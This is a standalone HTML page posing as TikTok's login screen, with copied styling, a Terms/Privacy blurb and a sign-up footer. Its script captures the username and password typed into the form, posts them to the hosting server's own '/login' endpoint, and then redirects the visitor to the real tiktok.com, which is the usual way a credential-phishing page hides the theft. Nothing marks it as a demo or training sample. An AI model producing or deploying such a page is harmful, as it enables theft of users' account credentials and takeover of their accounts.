<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <style>
        body {
            font-family: "Proxima Nova", Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
        }
        .container {
            width: 480px;
            text-align: center;
        }
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 16px;
            color: rgba(22, 24, 35, 1);
        }
        .subtitle {
            font-size: 15px;
            color: rgba(22, 24, 35, 0.5);
            margin-bottom: 32px;
        }
        .login-methods {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .method {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            position: relative;
            background: #fff;
            color: rgba(22, 24, 35, 1);
            font-size: 15px;
        }
        .method:hover {
            background-color: rgba(22, 24, 35, 0.03);
        }
        .form-container {
            text-align: left;
            margin-top: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            background: rgba(22, 24, 35, 0.06);
            border: 1px solid transparent;
            border-radius: 4px;
            margin-bottom: 12px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            background: rgba(22, 24, 35, 0.03);
            border-color: rgba(22, 24, 35, 0.12);
            outline: none;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #fe2c55;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        .submit-btn:disabled {
            background-color: rgba(22, 24, 35, 0.06);
            color: rgba(22, 24, 35, 0.34);
        }
        .footer {
            margin-top: 60px;
            padding: 24px;
            background-color: #fff;
            border-top: 1px solid rgba(22, 24, 35, 0.12);
            width: 100%;
            position: fixed;
            bottom: 0;
            left: 0;
            text-align: center;
            font-size: 15px;
        }
        .footer a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
    <script>
        async function handleLogin(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    window.location.href = "https://www.tiktok.com";
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Log in to TikTok</h1>
        <div class="subtitle">Manage your account, check notifications, comment on videos, and more.</div>
        
        <div class="form-container">
            <form id="login-form" onsubmit="handleLogin(event)">
                <div style="font-weight: 600; margin-bottom: 8px;">Phone / Email / Username</div>
                <input type="text" id="username" name="username" placeholder="Phone number, email or username" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                
                <button type="submit" class="submit-btn">Log in</button>
            </form>
        </div>
        
        <div style="margin-top: 20px; font-size: 12px; color: rgba(22, 24, 35, 0.5); line-height: 1.5;">
            By continuing, you agree to TikTok's <a href="#" style="color: #161823; font-weight: 600;">Terms of Service</a> and confirm that you have read TikTok's <a href="#" style="color: #161823; font-weight: 600;">Privacy Policy</a>.
        </div>
    </div>
    
    <div class="footer">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</body>
</html>
